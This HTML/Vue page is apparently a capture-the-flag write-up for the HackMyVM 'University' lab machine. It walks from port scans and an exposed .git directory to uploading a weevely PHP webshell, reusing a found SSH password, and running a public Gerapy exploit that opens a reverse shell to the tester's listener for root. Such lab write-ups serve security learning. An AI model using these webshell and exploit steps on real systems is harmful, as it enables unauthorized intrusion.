<template>
  <div class="report">
    <div class="container">
      <h1 id="university">
        University
      </h1>
      <p>This is a vulnerable VM uploaded to HackMyVM on January 19, 2022. You may find its page <a href="https://hackmyvm.eu/machines/machine.php?vm=University">here</a>.</p>
      <p>I’ve made an entry in my <code>/etc/hosts</code> file for <code>university.local</code>. It refers to the IP address of the machine, for ease of use.</p>
      <h2 id="process">
        Process
      </h2>
      <h3 id="initial-scans">
        Initial Scans
      </h3>
      <p>As always, start out with an <code>nmap</code> scan, to see what ports are open:</p>
      <pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 21:05 MST
Nmap scan report for university.local (172.16.231.143)
Host is up (0.00068s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds</code></pre>
      <p>Ports 22 and 80 are open, and no others. We shouldn’t have to look too far to get in.</p>
      <p>Port 80 is an nginx service with a pretty ugly website.</p>
      <p><img src="../assets/screenshots/ss0.png"></p>
      <p>A quick nikto scan:</p>
      <pre><code>- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.231.143
+ Target Hostname:    university.local
+ Target Port:        80
+ Start Time:         2022-01-31 13:36:41 (GMT-7)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ 7785 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-01-31 13:36:53 (GMT-7) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</code></pre>
      <p>This shows us some good data, but the true gem here is the <code>/.git/config</code> file. This is a git repo. Here’s the contents of that file:</p>
      <pre><code>[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote &quot;origin&quot;]
    url = https://github.com/rskoolrash/Online-Admission-System
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch &quot;master&quot;]
    remote = origin
    merge = refs/heads/master
</code></pre>
      <p>The url takes us to a GitHub-hosted repo, <a href="https://github.com/rskoolrash/Online-Admission-System">Online Admission System</a>. This gives us an accurate read of the file structure, and all the source code. Easy mode: on.</p>
      <h3 id="getting-user">
        Getting User
      </h3>
      <p>We can poke around in some of the files. <code>index.php</code> looks vulnerable to SQL injection, but I can’t seem to get it to trigger.</p>
      <p>There’s also a <code>fileupload.php</code>, included within <code>documents.php</code>. The files uploaded here aren’t validated worth anything. Let’s try it out.</p>
      <p>Generate a PHP webshell:</p>
      <div
        id="cb4"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a
          href="#cb4-1"
          aria-hidden="true"
          tabindex="-1"
        /><span class="ex">weevely</span> generate mIvQtTGm webshell.php</span></code></pre>
      </div>
      <p>Upload it to the site:</p>
      <p><img src="../assets/screenshots/ss1.png"></p>
      <p>Access the webshell:</p>
      <div
        id="cb5"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a
          href="#cb5-1"
          aria-hidden="true"
          tabindex="-1"
        /><span class="ex">weevely</span> http://university.local/studentpic/webshell.php mIvQtTGm</span></code></pre>
      </div>
      <p>This gives us a shell. We can see that nothing has changed in this git repo (except our upload) with <code>git status</code>. Stepping just outside the web root, we can see a hidden file called <code>.sandra_secret</code>. Contents are <code>Myyogaiseasy</code>. Trying out <code>sandra:Myyogaiseasy</code> over SSH gets us in.</p>
      <div
        id="cb6"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a
          href="#cb6-1"
          aria-hidden="true"
          tabindex="-1"
        /><span class="fu">cat</span> ~/user.txt</span></code></pre>
      </div>
      <p>Outputs:</p>
      <pre><code>HMV094REDACTED25HMV</code></pre>
      <p><img src="../assets/screenshots/ss2.png"></p>
      <h3 id="getting-root">
        Getting Root
      </h3>
      <p>Running <code>sudo -l</code> shows us that Sandra can run <code>gerapy</code> as root. I’ve never heard of this before. A quick Duck shows us that it is a “Distributed Crawler Management Framework Based on Scrapy, Scrapyd, Scrapyd-Client, Scrapyd-API, Django and Vue.js.”. So it helps web crawlers collaborate. Pretty boring, and <a href="https://gtfobins.github.io/">GTFOBins</a> doesn’t mention it.</p>
      <p>Exploit Database has a single entry, for Gerapy 0.9.7, that allows for authenticated remote code execution. Time to download and run unvetted code!</p>
      <p>The code needs a running server, and it also needs a “project” to already exist. Getting that started is simple:</p>
      <div
        id="cb8"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a
                                                                     href="#cb8-1"
                                                                     aria-hidden="true"
                                                                     tabindex="-1"
                                                                   /><span class="co"># On remote, as Sandra</span></span>
<span id="cb8-2"><a
href="#cb8-2"
aria-hidden="true"
tabindex="-1"
/><span class="fu">sudo</span> gerapy init</span>
<span id="cb8-3"><a
href="#cb8-3"
aria-hidden="true"
tabindex="-1"
/><span class="bu">cd</span> gerapy</span>
<span id="cb8-4"><a
href="#cb8-4"
aria-hidden="true"
tabindex="-1"
/><span class="fu">sudo</span> gerapy migrate</span>
<span id="cb8-5"><a
href="#cb8-5"
aria-hidden="true"
tabindex="-1"
/><span class="fu">sudo</span> gerapy initadmin</span>
<span id="cb8-6"><a
href="#cb8-6"
        aria-hidden="true"
tabindex="-1"
        /><span class="fu">sudo</span> gerapy runserver 0.0.0.0:8000</span></code></pre>
      </div>
      <p>Then log in through the browser and create a project.</p>
      <p><img src="../assets/screenshots/ss3.png"></p>
      <p>Running the exploit is simple:</p>
      <div
        id="cb9"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a
          href="#cb9-1"
          aria-hidden="true"
          tabindex="-1"
        /><span class="ex">python3</span> exploit.py <span class="at">-t</span> university.local <span class="at">-p</span> 8000 <span class="at">-L</span> 172.16.231.130 <span class="at">-P</span> 9000</span></code></pre>
      </div>
      <p>This spawns a shell as <code>root</code>.</p>
      <div
        id="cb10"
        class="sourceCode"
      >
        <pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a
          href="#cb10-1"
          aria-hidden="true"
          tabindex="-1"
        /><span class="fu">cat</span> ~/root.txt</span></code></pre>
      </div>
      <p>Outputs:</p>
      <pre><code>HMV111REDACTED87HMV</code></pre>
      <p><img src="../assets/screenshots/ss4.png"></p>
    </div>
  </div>
</template>

<style scoped>
img {
  width: 100%;
}
</style>